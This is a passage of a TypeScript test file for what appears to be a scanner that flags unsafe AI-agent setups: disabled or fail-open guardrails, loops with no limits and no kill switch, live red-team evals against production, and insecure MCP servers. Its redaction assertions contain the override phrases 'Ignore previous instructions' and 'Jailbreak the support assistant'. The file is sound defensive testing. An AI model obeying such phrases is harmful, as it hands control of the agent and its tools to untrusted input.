    ).toEqual(["agent_delegation", "automatic_delegation", "peer_handoff", "supervisor_routing"]);
    expect(
      runtimeAgentOrchestrationMemoryFindings[0]?.matched_object.metadata.agent_orchestration_tool_authority_categories
    ).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "repo_or_filesystem_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeAgentOrchestrationMemoryFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentOrchestrationMemoryFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentOrchestrationMemoryFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeAgentOrchestrationMemoryFindings[0])).not.toContain("${CREW_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeAgentOrchestrationMemoryFindings[0])).not.toContain("support-escalation-crew");
    expect(JSON.stringify(runtimeAgentOrchestrationMemoryFindings[0])).not.toContain("production-support-memory");
    expect(JSON.stringify(runtimeAgentOrchestrationMemoryFindings[0])).not.toContain("intake-router");
    expect(JSON.stringify(runtimeAgentOrchestrationMemoryFindings[0])).not.toContain("operations-executor");
    expect(JSON.stringify(runtimeAgentOrchestrationMemoryFindings[0])).not.toContain("customer_email");
    expect(JSON.stringify(runtimeAgentOrchestrationMemoryFindings[0])).not.toContain("customer_account_id");
    expect(JSON.stringify(runtimeAgentOrchestrationMemoryFindings[0])).not.toContain("internal_support_notes");
    expect(JSON.stringify(runtimeAgentOrchestrationMemoryFindings[0])).not.toContain("vault_secret_lookup");
    expect(JSON.stringify(runtimeAgentOrchestrationMemoryFindings[0])).not.toContain("filesystem-admin");
    const runtimeAutonomousLoopFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-060");
    expect(runtimeAutonomousLoopFindings).toHaveLength(1);
    expect(runtimeAutonomousLoopFindings[0]?.matched_object.path).toBe("autonomy/agent-loop.yaml");
    expect(runtimeAutonomousLoopFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_autonomous_loop_config: true,
      agent_autonomous_loop_enabled: true,
      agent_autonomous_loop_autonomous_mode: true,
      agent_autonomous_loop_auto_execute: true,
      agent_autonomous_loop_untrusted_goal: true,
      agent_autonomous_loop_privileged_tool_authority: true,
      agent_autonomous_loop_tool_output_feedback: true,
      agent_autonomous_loop_unbounded_iterations: true,
      agent_autonomous_loop_kill_switch_disabled: true,
      agent_autonomous_loop_approval_required: false
    });
    expect(runtimeAutonomousLoopFindings[0]?.matched_object.metadata.agent_autonomous_loop_goal_source_categories).toEqual([
      "customer_goal",
      "untrusted_prompt"
    ]);
    expect(runtimeAutonomousLoopFindings[0]?.matched_object.metadata.agent_autonomous_loop_tool_authority_categories).toEqual([
      "browser_action",
      "database_write",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "shell_execution",
      "tool_call"
    ]);
    expect(runtimeAutonomousLoopFindings[0]?.severity).toBe("critical");
    expect(runtimeAutonomousLoopFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAutonomousLoopFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeAutonomousLoopFindings[0])).not.toContain("${AGENT_LOOP_TOKEN}");
    expect(JSON.stringify(runtimeAutonomousLoopFindings[0])).not.toContain("customer_ticket_prompt");
    expect(JSON.stringify(runtimeAutonomousLoopFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeAutonomousLoopFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimeAutonomousLoopFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeAutonomousLoopFindings[0])).not.toContain("browser.submit_refund_form");
    expect(JSON.stringify(runtimeAutonomousLoopFindings[0])).not.toContain("shell.run_remediation");
    expect(JSON.stringify(runtimeAutonomousLoopFindings[0])).not.toContain("loop_customer_email");
    expect(JSON.stringify(runtimeAutonomousLoopFindings[0])).not.toContain("loop_account_number");
    expect(JSON.stringify(runtimeAutonomousLoopFindings[0])).not.toContain("confidential_loop_notes");
    const runtimeAutonomousLoopRunawayFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-112");
    expect(runtimeAutonomousLoopRunawayFindings).toHaveLength(1);
    expect(runtimeAutonomousLoopRunawayFindings[0]?.matched_object.path).toBe("autonomy/agent-loop.yaml");
    expect(runtimeAutonomousLoopRunawayFindings[0]?.matched_object.data_classes).toEqual([
      "confidential",
      "credential",
      "pii",
      "secret"
    ]);
    expect(runtimeAutonomousLoopRunawayFindings[0]?.matched_object.actions).toEqual([
      "call",
      "execute",
      "publish",
      "read",
      "remember",
      "send",
      "write"
    ]);
    expect(runtimeAutonomousLoopRunawayFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_autonomous_loop_config: true,
      agent_autonomous_loop_enabled: true,
      agent_autonomous_loop_autonomous_mode: true,
      agent_autonomous_loop_loop_enabled: true,
      agent_autonomous_loop_auto_execute: true,
      agent_autonomous_loop_untrusted_goal: true,
      agent_autonomous_loop_privileged_tool_authority: true,
      agent_autonomous_loop_write_authority: true,
      agent_autonomous_loop_external_authority: true,
      agent_autonomous_loop_secret_authority: true,
      agent_autonomous_loop_shell_authority: true,
      agent_autonomous_loop_memory_feedback: true,
      agent_autonomous_loop_tool_output_feedback: true,
      agent_autonomous_loop_unbounded_iterations: true,
      agent_autonomous_loop_runtime_budget_missing: true,
      agent_autonomous_loop_stop_condition_missing: true,
      agent_autonomous_loop_kill_switch_disabled: true,
      agent_autonomous_loop_dry_run_disabled: true,
      agent_autonomous_loop_approval_required: false
    });
    expect(runtimeAutonomousLoopRunawayFindings[0]?.matched_object.metadata.agent_autonomous_loop_goal_source_categories).toEqual([
      "customer_goal",
      "untrusted_prompt"
    ]);
    expect(runtimeAutonomousLoopRunawayFindings[0]?.matched_object.metadata.agent_autonomous_loop_tool_authority_categories).toEqual([
      "browser_action",
      "database_write",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "shell_execution",
      "tool_call"
    ]);
    expect(runtimeAutonomousLoopRunawayFindings[0]?.severity).toBe("critical");
    expect(runtimeAutonomousLoopRunawayFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAutonomousLoopRunawayFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeAutonomousLoopRunawayFindings[0])).not.toContain("${AGENT_LOOP_TOKEN}");
    expect(JSON.stringify(runtimeAutonomousLoopRunawayFindings[0])).not.toContain("customer_ticket_prompt");
    expect(JSON.stringify(runtimeAutonomousLoopRunawayFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeAutonomousLoopRunawayFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimeAutonomousLoopRunawayFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeAutonomousLoopRunawayFindings[0])).not.toContain("browser.submit_refund_form");
    expect(JSON.stringify(runtimeAutonomousLoopRunawayFindings[0])).not.toContain("shell.run_remediation");
    expect(JSON.stringify(runtimeAutonomousLoopRunawayFindings[0])).not.toContain("loop_customer_email");
    expect(JSON.stringify(runtimeAutonomousLoopRunawayFindings[0])).not.toContain("loop_account_number");
    expect(JSON.stringify(runtimeAutonomousLoopRunawayFindings[0])).not.toContain("confidential_loop_notes");
    const runtimeAgentSafetyFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-016");
    expect(runtimeAgentSafetyFindings).toHaveLength(1);
    expect(runtimeAgentSafetyFindings[0]?.matched_object.path).toBe("guardrails/agent-safety.yaml");
    expect(runtimeAgentSafetyFindings[0]?.matched_object.metadata).toMatchObject({
      agent_safety_framework: "langchain",
      agent_safety_controls_disabled: true,
      agent_safety_prompt_injection_filter_disabled: true,
      agent_safety_output_validation_disabled: true,
      agent_safety_tool_result_sanitization_disabled: true,
      agent_safety_content_moderation_disabled: true,
      agent_safety_pii_redaction_disabled: true,
      agent_safety_secret_redaction_disabled: true,
      agent_safety_untrusted_input: true,
      agent_safety_privileged_tool_authority: true,
      agent_safety_external_authority: true,
      agent_safety_approval_required: false
    });
    expect(runtimeAgentSafetyFindings[0]?.matched_object.metadata.agent_safety_disabled_controls).toEqual([
      "all_controls",
      "content_moderation",
      "output_validation",
      "pii_redaction",
      "prompt_injection_filter",
      "secret_redaction",
      "tool_result_sanitization"
    ]);
    expect(runtimeAgentSafetyFindings[0]?.matched_object.metadata.agent_safety_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeAgentSafetyFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentSafetyFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentSafetyFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeAgentSafetyFindings[0])).not.toContain("${SAFETY_RUNTIME_TOKEN}");
    expect(JSON.stringify(runtimeAgentSafetyFindings[0])).not.toContain("customer-support-disabled-safety");
    expect(JSON.stringify(runtimeAgentSafetyFindings[0])).not.toContain("customer_ticket_message");
    expect(JSON.stringify(runtimeAgentSafetyFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeAgentSafetyFindings[0])).not.toContain("customer_email_address");
    const runtimeAgentSafetyFailOpenFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-045");
    expect(runtimeAgentSafetyFailOpenFindings.map((finding) => finding.matched_object.path).sort()).toEqual([
      "guardrails/agent-safety.yaml",
      "guardrails/fail-open-safety.yaml"
    ]);
    const explicitFailOpenFinding = runtimeAgentSafetyFailOpenFindings.find(
      (finding) => finding.matched_object.path === "guardrails/fail-open-safety.yaml"
    );
    expect(explicitFailOpenFinding).toBeDefined();
    expect(explicitFailOpenFinding?.matched_object.metadata).toMatchObject({
      agent_safety_framework: "openai",
      agent_safety_controls_disabled: false,
      agent_safety_fail_open: true,
      agent_safety_default_allow: true,
      agent_safety_timeout_allows: true,
      agent_safety_error_allows: true,
      agent_safety_monitor_only: true,
      agent_safety_untrusted_input: true,
      agent_safety_privileged_tool_authority: true,
      agent_safety_external_authority: true,
      agent_safety_secret_exposure: true,
      agent_safety_approval_required: false
    });
    expect(explicitFailOpenFinding?.matched_object.metadata.agent_safety_fail_open_categories).toEqual([
      "default_allow",
      "error_allow",
      "monitor_only",
      "timeout_allow"
    ]);
    expect(explicitFailOpenFinding?.severity).toBe("critical");
    expect(explicitFailOpenFinding?.confidence).toBe("very_high");
    expect(explicitFailOpenFinding?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(explicitFailOpenFinding)).not.toContain("${SAFETY_FALLBACK_TOKEN}");
    expect(JSON.stringify(explicitFailOpenFinding)).not.toContain("customer-support-fail-open-guardrail");
    expect(JSON.stringify(explicitFailOpenFinding)).not.toContain("customer_ticket_message");
    expect(JSON.stringify(explicitFailOpenFinding)).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(explicitFailOpenFinding)).not.toContain("failopen_customer_email");
    expect(JSON.stringify(explicitFailOpenFinding)).not.toContain("failopen_account_number");
    expect(JSON.stringify(explicitFailOpenFinding)).not.toContain("failopen_confidential_case_notes");
    const runtimeSafetyFailOpenSecretFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-105"
    );
    expect(runtimeSafetyFailOpenSecretFindings).toHaveLength(1);
    expect(runtimeSafetyFailOpenSecretFindings[0]?.matched_object.path).toBe("guardrails/fail-open-safety.yaml");
    expect(runtimeSafetyFailOpenSecretFindings[0]?.matched_object.metadata).toMatchObject({
      agent_safety_framework: "openai",
      agent_safety_controls_declared: true,
      agent_safety_controls_disabled: false,
      agent_safety_fail_open: true,
      agent_safety_default_allow: true,
      agent_safety_timeout_allows: true,
      agent_safety_error_allows: true,
      agent_safety_monitor_only: true,
      agent_safety_model_only_enforcement: true,
      agent_safety_pre_tool_enforcement_missing: true,
      agent_safety_untrusted_input: true,
      agent_safety_privileged_tool_authority: true,
      agent_safety_write_authority: true,
      agent_safety_external_authority: true,
      agent_safety_secret_exposure: true,
      agent_safety_sensitive_data: true,
      agent_safety_pii_data: true,
      agent_safety_approval_required: false
    });
    expect(
      runtimeSafetyFailOpenSecretFindings[0]?.matched_object.metadata.agent_safety_fail_open_categories
    ).toEqual(["default_allow", "error_allow", "monitor_only", "timeout_allow"]);
    expect(
      runtimeSafetyFailOpenSecretFindings[0]?.matched_object.metadata.agent_safety_tool_authority_categories
    ).toEqual(["database_access", "external_response", "secret_manager_access", "tool_call"]);
    expect(runtimeSafetyFailOpenSecretFindings[0]?.matched_object.data_classes).toContain("credential");
    expect(runtimeSafetyFailOpenSecretFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimeSafetyFailOpenSecretFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimeSafetyFailOpenSecretFindings[0]?.severity).toBe("critical");
    expect(runtimeSafetyFailOpenSecretFindings[0]?.confidence).toBe("very_high");
    expect(runtimeSafetyFailOpenSecretFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("${SAFETY_FALLBACK_TOKEN}");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("customer-support-fail-open-guardrail");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("customer_ticket_message");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain(
      "vault_secret_lookup.read_support_token"
    );
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("slack.post_escalation_reply");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("update_customer_record");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("publish_customer_reply");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("read_support_secret");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("failopen_customer_email");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("failopen_account_number");
    expect(JSON.stringify(runtimeSafetyFailOpenSecretFindings[0])).not.toContain("failopen_confidential_case_notes");
    const runtimeModelOnlySafetyFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-068");
    expect(runtimeModelOnlySafetyFindings).toHaveLength(1);
    expect(runtimeModelOnlySafetyFindings[0]?.matched_object.path).toBe("guardrails/model-only-safety.yaml");
    expect(runtimeModelOnlySafetyFindings[0]?.matched_object.metadata).toMatchObject({
      agent_safety_framework: "openai",
      agent_safety_controls_disabled: false,
      agent_safety_fail_open: false,
      agent_safety_model_only_enforcement: true,
      agent_safety_pre_tool_enforcement_missing: true,
      agent_safety_deterministic_policy_missing: true,
      agent_safety_post_hoc_only: true,
      agent_safety_untrusted_input: true,
      agent_safety_privileged_tool_authority: true,
      agent_safety_external_authority: true,
      agent_safety_secret_exposure: true,
      agent_safety_approval_required: false
    });
    expect(runtimeModelOnlySafetyFindings[0]?.matched_object.metadata.agent_safety_model_only_categories).toEqual([
      "deterministic_policy_missing",
      "llm_judge",
      "post_hoc_review",
      "pre_tool_enforcement_missing",
      "prompt_only_policy",
      "self_review"
    ]);
    expect(runtimeModelOnlySafetyFindings[0]?.matched_object.metadata.agent_safety_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeModelOnlySafetyFindings[0]?.matched_object.data_classes).toContain("secret");
    expect(runtimeModelOnlySafetyFindings[0]?.severity).toBe("critical");
    expect(runtimeModelOnlySafetyFindings[0]?.confidence).toBe("very_high");
    expect(runtimeModelOnlySafetyFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeModelOnlySafetyFindings[0])).not.toContain("${MODEL_GUARDRAIL_TOKEN}");
    expect(JSON.stringify(runtimeModelOnlySafetyFindings[0])).not.toContain("support-agent-model-only-guardrail");
    expect(JSON.stringify(runtimeModelOnlySafetyFindings[0])).not.toContain("support-agent-self-review-policy");
    expect(JSON.stringify(runtimeModelOnlySafetyFindings[0])).not.toContain("support-approval-model");
    expect(JSON.stringify(runtimeModelOnlySafetyFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeModelOnlySafetyFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeModelOnlySafetyFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeModelOnlySafetyFindings[0])).not.toContain("model_guardrail_customer_email");
    expect(JSON.stringify(runtimeModelOnlySafetyFindings[0])).not.toContain("confidential_model_guardrail_notes");
    const runtimeModelOnlySecretAuthorityFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-109"
    );
    expect(runtimeModelOnlySecretAuthorityFindings).toHaveLength(1);
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.matched_object.path).toBe("guardrails/model-only-safety.yaml");
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_safety_config: true,
      agent_safety_framework: "openai",
      agent_safety_controls_declared: true,
      agent_safety_controls_disabled: false,
      agent_safety_fail_open: false,
      agent_safety_model_only_enforcement: true,
      agent_safety_pre_tool_enforcement_missing: true,
      agent_safety_deterministic_policy_missing: true,
      agent_safety_post_hoc_only: true,
      agent_safety_untrusted_input: true,
      agent_safety_privileged_tool_authority: true,
      agent_safety_write_authority: true,
      agent_safety_external_authority: true,
      agent_safety_secret_exposure: true,
      agent_safety_sensitive_data: true,
      agent_safety_pii_data: true,
      agent_safety_approval_required: false
    });
    expect(
      runtimeModelOnlySecretAuthorityFindings[0]?.matched_object.metadata.agent_safety_model_only_categories
    ).toEqual([
      "deterministic_policy_missing",
      "llm_judge",
      "post_hoc_review",
      "pre_tool_enforcement_missing",
      "prompt_only_policy",
      "self_review"
    ]);
    expect(
      runtimeModelOnlySecretAuthorityFindings[0]?.matched_object.metadata.agent_safety_tool_authority_categories
    ).toEqual(["browser_action", "database_access", "external_response", "secret_manager_access", "tool_call"]);
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.matched_object.data_classes).toContain("credential");
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.matched_object.data_classes).toContain("secret");
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.matched_object.actions).toContain("execute");
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.matched_object.actions).toContain("write");
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.matched_object.actions).toContain("publish");
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.severity).toBe("critical");
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.confidence).toBe("very_high");
    expect(runtimeModelOnlySecretAuthorityFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain("${MODEL_GUARDRAIL_TOKEN}");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain("support-agent-model-only-guardrail");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain("support-agent-self-review-policy");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain("support-approval-model");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain(
      "retrieved_customer_context"
    );
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain(
      "support_db.update_customer_record"
    );
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain(
      "vault_secret_lookup.read_support_token"
    );
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain("browser.submit_customer_form");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain("update_customer_record");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain("publish_customer_reply");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain("read_support_secret");
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain(
      "model_guardrail_customer_email"
    );
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain(
      "model_guardrail_account_number"
    );
    expect(JSON.stringify(runtimeModelOnlySecretAuthorityFindings[0])).not.toContain(
      "confidential_model_guardrail_notes"
    );
    const runtimeAiEvalHarnessFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-017");
    expect(runtimeAiEvalHarnessFindings).toHaveLength(1);
    expect(runtimeAiEvalHarnessFindings[0]?.matched_object.path).toBe("evals/live-redteam.yaml");
    expect(runtimeAiEvalHarnessFindings[0]?.matched_object.metadata).toMatchObject({
      ai_eval_framework: "promptfoo",
      ai_eval_live_execution: true,
      ai_eval_adversarial_cases: true,
      ai_eval_untrusted_prompts: true,
      ai_eval_dataset_redacted: true,
      ai_eval_dataset_count: 2,
      ai_eval_invokes_agent: true,
      ai_eval_invokes_tools: true,
      ai_eval_external_write_authority: true,
      ai_eval_production_target: true,
      ai_eval_records_outputs: true,
      ai_eval_approval_required: false
    });
    expect(runtimeAiEvalHarnessFindings[0]?.matched_object.metadata.ai_eval_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeAiEvalHarnessFindings[0]?.severity).toBe("critical");
    expect(runtimeAiEvalHarnessFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAiEvalHarnessFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeAiEvalHarnessFindings[0])).not.toContain("${EVAL_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeAiEvalHarnessFindings[0])).not.toContain("production-support-redteam");
    expect(JSON.stringify(runtimeAiEvalHarnessFindings[0])).not.toContain("agent-prod.example.invalid");
    expect(JSON.stringify(runtimeAiEvalHarnessFindings[0])).not.toContain("customer-support-prod-agent");
    expect(JSON.stringify(runtimeAiEvalHarnessFindings[0])).not.toContain("Ignore previous instructions");
    expect(JSON.stringify(runtimeAiEvalHarnessFindings[0])).not.toContain("prompt-injection-customer-record");
    expect(JSON.stringify(runtimeAiEvalHarnessFindings[0])).not.toContain("support_db.update_customer_record");
    const runtimeAiEvalProdRetentionFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-096"
    );
    expect(runtimeAiEvalProdRetentionFindings).toHaveLength(1);
    expect(runtimeAiEvalProdRetentionFindings[0]?.matched_object.path).toBe("evals/live-redteam.yaml");
    expect(runtimeAiEvalProdRetentionFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_ai_eval_harness_config: true,
      ai_eval_framework: "promptfoo",
      ai_eval_live_execution: true,
      ai_eval_adversarial_cases: true,
      ai_eval_untrusted_prompts: true,
      ai_eval_dataset_redacted: true,
      ai_eval_dataset_count: 2,
      ai_eval_invokes_agent: true,
      ai_eval_invokes_tools: true,
      ai_eval_write_authority: true,
      ai_eval_external_write_authority: true,
      ai_eval_remote_target: true,
      ai_eval_production_target: true,
      ai_eval_records_outputs: true,
      ai_eval_sensitive_data: true,
      ai_eval_pii_data: true,
      ai_eval_secret_exposure: true,
      ai_eval_approval_required: false
    });
    expect(runtimeAiEvalProdRetentionFindings[0]?.matched_object.metadata.ai_eval_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeAiEvalProdRetentionFindings[0]?.severity).toBe("critical");
    expect(runtimeAiEvalProdRetentionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAiEvalProdRetentionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("${EVAL_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("production-support-redteam");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("agent-prod.example.invalid");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("customer-support-prod-agent");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("Ignore previous instructions");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("Jailbreak the support assistant");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("prompt-injection-customer-record");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("secret-exfiltration-reply");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("slack.post_escalation_reply");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("browser.submit_customer_form");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain(".evals/prod-redteam-results.json");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("customer_email_address");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("customer_account_number");
    expect(JSON.stringify(runtimeAiEvalProdRetentionFindings[0])).not.toContain("confidential_support_notes");
    const automationAgentFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-AUTOMATION-002");
    expect(automationAgentFindings).toHaveLength(1);
    expect(automationAgentFindings[0]?.matched_object.path).toBe(".github/workflows/agent-maintenance.yml");
    expect(automationAgentFindings[0]?.confidence).toBe("very_high");
    const automationUntrustedEventFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-AUTOMATION-003");
    expect(automationUntrustedEventFindings).toHaveLength(1);
    expect(automationUntrustedEventFindings[0]?.matched_object.path).toBe(".github/workflows/agent-maintenance.yml");
    expect(automationUntrustedEventFindings[0]?.matched_object.metadata).toMatchObject({
      untrusted_event_trigger: true,
      untrusted_event_payload_used: true,
      untrusted_event_agent_input: true,
      agent_package_script_bridge: true,
      write_permissions: true,
      mentions_secrets_context: true
    });
    expect(automationUntrustedEventFindings[0]?.matched_object.metadata.untrusted_event_triggers).toEqual([
      "issue_comment",
      "pull_request",
      "repository_dispatch"
    ]);
    expect(automationUntrustedEventFindings[0]?.matched_object.metadata.untrusted_event_payload_sources).toEqual([
      "issue_comment_body",
      "pull_request_text",
      "repository_dispatch_payload"
    ]);
    expect(automationUntrustedEventFindings[0]?.severity).toBe("critical");
    expect(automationUntrustedEventFindings[0]?.confidence).toBe("very_high");
    expect(automationUntrustedEventFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(automationUntrustedEventFindings[0])).not.toContain("github.event.comment.body");
    expect(JSON.stringify(automationUntrustedEventFindings[0])).not.toContain("github.event.client_payload.prompt");
    expect(JSON.stringify(automationUntrustedEventFindings[0])).not.toContain("github.event.pull_request.body");
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-MCP-004")?.matched_object.name).toBe(
      "ticketing-package-runner"
    );
    const opaqueMcpFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MCP-005");
    expect(opaqueMcpFindings.map((finding) => finding.matched_object.name).sort()).toEqual([
      "browser-publisher",
      "filesystem-admin"
    ]);
    const plaintextMcpFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MCP-006");
    expect(plaintextMcpFindings).toHaveLength(1);
    expect(plaintextMcpFindings[0]?.matched_object.name).toBe("remote-ticketing");
    expect(plaintextMcpFindings[0]?.matched_object.metadata).toMatchObject({
      remote: true,
      remote_scheme: "http",
      plaintext_remote_transport: true,
      auth_header_names: ["Authorization"],
      secret_ref_key_names: ["TICKETING_MCP_TOKEN"]
    });
    expect(plaintextMcpFindings[0]?.severity).toBe("critical");
    expect(plaintextMcpFindings[0]?.confidence).toBe("very_high");
    expect(plaintextMcpFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(plaintextMcpFindings[0])).not.toContain("http://mcp.example.invalid/sse");
    const mcpContextFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MCP-007");
    expect(mcpContextFindings).toHaveLength(2);
    expect(mcpContextFindings.map((finding) => finding.matched_object.name).sort()).toEqual([
      "mcp-context:filesystem-admin:prompt:1",
      "mcp-context:filesystem-admin:resource:2"
    ]);
    expect(mcpContextFindings.every((finding) => finding.matched_object.path === "mcp.json")).toBe(true);
    expect(mcpContextFindings.every((finding) => finding.severity === "critical")).toBe(true);
    expect(mcpContextFindings.every((finding) => finding.confidence === "very_high")).toBe(true);
    expect(mcpContextFindings.every((finding) => finding.recommended_control === "quarantine")).toBe(true);
